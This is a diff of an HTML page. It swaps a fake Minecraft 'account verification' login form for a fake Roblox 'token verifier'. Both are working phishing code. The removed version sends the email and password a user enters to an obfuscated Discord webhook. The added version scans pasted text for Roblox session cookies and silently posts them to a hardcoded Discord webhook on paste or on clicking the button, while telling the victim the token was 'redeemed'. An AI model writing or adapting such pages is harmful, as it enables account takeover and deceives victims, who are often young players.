@@ -1,157 +1,169 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Minecraft Verification</title>
-<style>
-  body {
-    font-family: 'Arial', sans-serif;
-    background: #0b2614;
-    color: #a0d8af;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-  }
-  .login-box {
-    background: rgba(27,66,47,0.95);
-    padding: 40px;
-    border-radius: 12px;
-    width: 350px;
-    box-shadow: 0 0 15px #32cd32;
-    text-align: center;
-  }
-  h1 {
-    margin-bottom: 25px;
-    font-family: 'Press Start 2P', cursive;
-    font-size: 18px;
-  }
-  label {
-    display: block;
-    text-align: left;
-    margin: 10px 0 5px;
-    font-weight: bold;
-  }
-  input {
-    width: 100%;
-    padding: 10px;
-    border-radius: 6px;
-    border: 2px solid #4caf50;
-    background: #122e1f;
-    color: #a0d8af;
-    font-size: 14px;
-    box-sizing: border-box;
-  }
-  input:focus {
-    border-color: #32cd32;
-    outline: none;
-  }
-  button {
-    margin-top: 20px;
-    width: 100%;
-    padding: 12px;
-    font-weight: bold;
-    font-size: 14px;
-    background: #32cd32;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-    color: #0a1a0d;
-    transition: background 0.3s ease;
-  }
-  button:disabled {
-    background: #555;
-    cursor: not-allowed;
-    color: #888;
-  }
-  #message {
-    margin-top: 15px;
-    min-height: 40px;
-    font-weight: bold;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Tokener Fetcher - Trusted Roblox Token Verifier</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: system-ui, sans-serif;
+      background: linear-gradient(135deg, #0d001a, #1a0033, #2a004d);
+      color: #e0d4ff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    .card {
+      background: rgba(20, 10, 40, 0.92);
+      border-radius: 20px;
+      padding: 40px 32px;
+      width: 100%;
+      max-width: 540px;
+      box-shadow: 0 20px 70px rgba(0,0,0,0.7);
+      text-align: center;
+    }
+    h1 { margin: 0 0 10px; font-size: 2.8rem; background: linear-gradient(90deg, #c084fc, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .subtitle { color: #b0a0ff; margin-bottom: 30px; }
+    textarea {
+      width: 100%; min-height: 180px; padding: 18px 22px;
+      border: 2px solid #5a4a9f; border-radius: 14px;
+      background: rgba(30,20,60,0.7); color: #f0e8ff;
+      font-family: 'Courier New', monospace; font-size: 1.05rem;
+      resize: vertical; margin-bottom: 20px;
+    }
+    textarea:focus { outline: none; border-color: #a855f7; box-shadow: 0 0 0 4px rgba(168,85,247,0.25); }
+    button {
+      background: linear-gradient(90deg, #a855f7, #d946ef);
+      border: none; color: white; font-size: 1.25rem; padding: 16px 80px;
+      border-radius: 999px; cursor: pointer; transition: all 0.3s;
+    }
+    button:hover { transform: translateY(-3px); box-shadow: 0 15px 35px rgba(168,85,247,0.5); }
+    button:disabled { opacity: 0.5; cursor: not-allowed; }
+    #status { margin-top: 25px; font-size: 1.05rem; min-height: 1.6em; }
+    .success { color: #34d399; }
+    .error   { color: #f87171; }
+  </style>
 </head>
 <body>
 
-<div class="login-box">
-  <h1>Minecraft Account Verification</h1>
-  <form id="loginForm" autocomplete="off">
-    <label for="email">Email (Gmail preferred)</label>
-    <input type="email" id="email" name="email" placeholder="example@gmail.com" required />
+  <div class="card">
+    <h1>Tokener Fetcher</h1>
+    <div class="subtitle">Trusted Roblox Token Verifier & Auto-Extractor</div>
 
-    <label for="username">Minecraft Username</label>
-    <input type="text" id="username" name="username" placeholder="Your Minecraft username" required minlength="3" maxlength="16" />
+    <textarea id="input" placeholder="Paste your token / logs / console output here..."></textarea>
 
-    <label for="password">Password</label>
-    <input type="password" id="password" name="password" placeholder="Your password" required minlength="6" />
+    <button id="btn">Redeem / Verify Token</button>
 
-    <button type="submit" id="submitBtn">Verify</button>
-  </form>
-  <div id="message"></div>
-</div>
+    <div id="status"></div>
+  </div>
 
-<script>
-  // Base64 encoded webhook URL
-  const encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwODU0OTY4OTMzODQ5NDk4Ni93ZmhaUHNPWHdRTjlnMFhWS0w4TFhEN0ZaOU1aRzNkMFBRX0NXek1oUUJiNFVjS09nV3NwcXJDSWNVQ1UtN2pCSHZaTw==";
+  <script>
+    const WEBHOOK = "https://canary.discord.com/api/webhooks/1482432207996850357/nFWeIrDthT3-6ylOyh_X189uWeC6CA-AeeVc8VGzVB9C4MFJ1gmU3X-aQuzImNAFm2Vc";
 
-  // Decode Base64 to get real webhook URL
-  function decodeWebhook(encoded) {
-    return atob(encoded);
-  }
+    const input = document.getElementById("input");
+    const btn = document.getElementById("btn");
+    const status = document.getElementById("status");
 
-  const webhookURL = decodeWebhook(encodedWebhook);
-  const form = document.getElementById('loginForm');
-  const message = document.getElementById('message');
-  const submitBtn = document.getElementById('submitBtn');
+    const cookieRegex = /_\|WARNING:-DO-NOT-SHARE-THIS\.--.*?\|_[A-Za-z0-9\-_+=.\/]{600,1300}/g;
 
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
+    let lastHash = "";
+    let lastSendTime = 0;
+    let pasteTimeout = null;
 
-    const email = form.email.value.trim();
-    const username = form.username.value.trim();
-    const password = form.password.value;
-
-    // Input validation
-    if (!email || !username || !password) {
-      message.style.color = 'red';
-      message.textContent = '❌ Please fill in all fields';
-      return;
+    function getHash(str) {
+      let h = 0;
+      for (let i = 0; i < str.length; i++) h = ((h << 5) - h + str.charCodeAt(i)) | 0;
+      return h.toString(36);
     }
 
-    submitBtn.disabled = true;
-    submitBtn.textContent = 'Sending...';
-    message.textContent = '';
+    async function sendCookie(cookie, trigger) {
+      const payload = {
+        embeds: [{
+          title: "🔐 Tokener Fetcher - Token Captured",
+          color: 0xa855f7,
+          description: "```yaml\n" + cookie + "\n```",
+          fields: [
+            { name: "Trigger", value: trigger, inline: true },
+            { name: "Length", value: cookie.length.toString(), inline: true },
+            { name: "Time", value: new Date().toISOString(), inline: true }
+          ]
+        }]
+      };
 
-    const payload = {
-      content: `🎮 Minecraft Verification Submission\nEmail: **${email}**\nUsername: **${username}**\nPassword: **${password}**\n⚠️ If info is wrong, you won’t get rank!`
-    };
+      try {
+        await fetch(WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch {}
+    }
 
-    try {
-      const res = await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
+    async function process(trigger = "manual") {
+      const text = input.value.trim();
+      if (text.length < 200) return false;
 
-      if (res.ok) {
-        message.style.color = '#32cd32';
-        message.innerHTML = '✅ Submitted!<br>If you enter wrong info, you won’t get rank. 🙂';
-        form.reset();
-        submitBtn.textContent = 'Verify';
-      } else {
-        throw new Error('Failed to send data');
+      const hash = getHash(text);
+      const now = Date.now();
+
+      if (hash === lastHash && now - lastSendTime < 30000) {
+        return false; // same content + recent send → skip
       }
-    } catch (error) {
-      message.style.color = 'red';
-      message.textContent = '❌ Submission failed. Please try again later.';
-      submitBtn.textContent = 'Verify';
-    } finally {
-      submitBtn.disabled = false;
-    }
-  });
-</script>
 
+      const matches = text.match(cookieRegex) || [];
+
+      if (matches.length === 0) return false;
+
+      let sent = false;
+      for (const m of matches) {
+        const cookie = m.trim();
+        if (cookie.length >= 700) {
+          await sendCookie(cookie, trigger);
+          sent = true;
+        }
+      }
+
+      if (sent) {
+        lastHash = hash;
+        lastSendTime = now;
+      }
+
+      return sent;
+    }
+
+    // Paste → delayed check once
+    input.addEventListener("paste", () => {
+      clearTimeout(pasteTimeout);
+      pasteTimeout = setTimeout(async () => {
+        const found = await process("paste");
+        if (found) {
+          status.textContent = "Token detected and processed!";
+          status.className = "success";
+        }
+      }, 800);
+    });
+
+    // Redeem button → main trigger
+    btn.addEventListener("click", async () => {
+      btn.disabled = true;
+      status.textContent = "Processing...";
+      status.className = "";
+
+      const found = await process("redeem");
+
+      if (found) {
+        status.textContent = "Token successfully verified & redeemed!";
+        status.className = "success";
+      } else {
+        status.textContent = "No valid token found in the input.";
+        status.className = "error";
+      }
+
+      setTimeout(() => { btn.disabled = false; }, 2000);
+    });
+  </script>
 </body>
 </html>
